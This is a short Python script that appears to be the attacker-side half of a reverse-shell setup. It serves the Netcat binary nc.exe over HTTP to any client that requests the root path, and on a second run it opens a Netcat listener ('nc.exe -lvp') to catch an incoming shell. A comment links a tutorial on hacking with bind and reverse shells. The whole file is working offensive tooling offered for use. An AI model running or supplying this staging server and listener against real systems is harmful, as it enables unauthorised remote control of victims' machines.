#src: https://stackabuse.com/serving-files-with-pythons-simplehttpserver-module/
#multithreading: https://realpython.com/intro-to-python-threading/

import http.server
import socketserver
import subprocess
import threading
import time

downloadPort = 54414
listenerPort = 47017

class HttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = 'nc.exe'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        else: return None

def serverListen():
    print('Starting Server...')
    try:
        PORT = downloadPort
        my_server = socketserver.TCPServer(("", PORT), HttpRequestHandler)
        print('Server started. Execute a second instance to run the Netcat listener.')
        my_server.serve_forever()
    except OSError:
        print('Server already running.')
        netcatListen()

def netcatListen():
    #https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
    #netcat download windows: https://eternallybored.org/misc/netcat/
    print('Running Netcat listener...')
    subprocess.call('nc.exe -lvp ' + str(listenerPort), shell=True)

#thr = threading.Thread(target=netcatListen, daemon=True)
#thr.start()
time.sleep(.1)
serverListen()
